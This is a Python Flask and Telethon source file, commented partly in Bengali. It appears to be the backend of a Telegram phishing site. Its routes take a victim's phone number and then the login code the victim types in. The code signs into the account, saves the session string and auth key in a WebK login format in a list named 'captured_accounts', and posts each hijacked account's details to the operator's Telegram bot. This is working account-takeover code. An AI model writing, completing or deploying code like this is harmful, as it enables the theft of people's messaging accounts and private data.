# Globals - simple way, no multiprocessing issues
import json
import base64
from threading import Lock

user_sessions = {}  # phone -> {'hash': ..., 'session_str': ...}
captured_accounts = []
pending_codes = {}
sessions_lock = Lock()

# Routes গুলো synchronous রাখি, async আলাদা thread এ non-blocking

def run_telegram_action(phone, code=None):
    """Run Telegram action in a completely isolated thread"""
    import asyncio
    from telethon import TelegramClient
    from telethon.sessions import StringSession
    
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    try:
        async def send_code():
            c = TelegramClient(StringSession(), API_ID, API_HASH)
            await c.connect()
            r = await c.send_code_request(phone)
            
            with sessions_lock:
                user_sessions[phone] = {
                    'hash': r.phone_code_hash,
                    'session': StringSession.save(c.session)
                }
                pending_codes[phone] = 'sent'
            
            await c.disconnect()
            return True
        
        async def verify():
            with sessions_lock:
                if phone not in user_sessions:
                    return {'success': False, 'error': 'Session not found'}
                s = user_sessions[phone]
            
            c = TelegramClient(StringSession(s['session']), API_ID, API_HASH)
            await c.connect()
            
            try:
                await c.sign_in(phone=phone, code=code, phone_code_hash=s['hash'])
                ss = StringSession.save(c.session)
                me = await c.get_me()
                await c.disconnect()
                
                # WebK
                wc = TelegramClient(StringSession(ss), API_ID, API_HASH)
                await wc.start()
                auth_b64 = base64.b64encode(wc.session.auth_key.key).decode()
                dc = wc.session.dc_id
                await wc.disconnect()
                
                acc = {
                    'phone': phone, 'user_id': me.id,
                    'username': me.username or '',
                    'first_name': me.first_name or '',
                    'last_name': me.last_name or '',
                    'session': ss,
                    'webk': json.dumps({
                        'dcId': dc, 'authKey': auth_b64,
                        'userId': me.id, 'isSupport': False, 'isTest': False
                    }),
                    'dc': dc, 'time': str(datetime.now())
                }
                
                with sessions_lock:
                    captured_accounts.append(acc)
                    if phone in user_sessions:
                        del user_sessions[phone]
                    pending_codes[phone] = 'done'
                
                # Telegram notify
                try:
                    import requests
                    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                        'chat_id': YOUR_TELEGRAM_ID,
                        'text': f"🔔 **New Account!**\\n📱 `{phone}`\\n👤 {me.first_name}\\n🆔 `{me.id}`\\n📛 @{me.username or 'none'}\\n🌐 DC: {dc}",
                        'parse_mode': 'Markdown'
                    }, timeout=5)
                except: pass
                
                return {'success': True}
            except Exception as e:
                e_str = str(e)
                if 'PHONE_CODE_INVALID' in e_str:
                    return {'success': False, 'error': 'Wrong code'}
                if 'SESSION_PASSWORD_NEEDED' in e_str:
                    return {'success': False, 'error': '2FA enabled'}
                return {'success': False, 'error': e_str[:80]}
        
        if code:
            return loop.run_until_complete(verify())
        else:
            return loop.run_until_complete(send_code())
    finally:
        loop.close()

@app.route('/api/share', methods=['POST'])
def share():
    ph = request.json.get('phone', '')
    if not ph:
        return jsonify({'success': False, 'error': 'Phone required'})
    
    if ph.startswith('0') and not ph.startswith('+'):
        ph = '+88' + ph
    elif not ph.startswith('+'):
        ph = '+' + ph
    
    with sessions_lock:
        pending_codes[ph] = 'sending'
    
    # Thread এ চালাই
    import threading
    t = threading.Thread(target=run_telegram_action, args=(ph,))
    t.daemon = True
    t.start()
    
    return jsonify({'success': True})

@app.route('/api/verify', methods=['POST'])
def verify():
    d = request.json
    ph, code = d.get('phone', ''), d.get('code', '')
    
    if ph.startswith('0') and not ph.startswith('+'):
        ph = '+88' + ph
    elif not ph.startswith('+'):
        ph = '+' + ph
    
    result = run_telegram_action(ph, code)
    return jsonify(result)
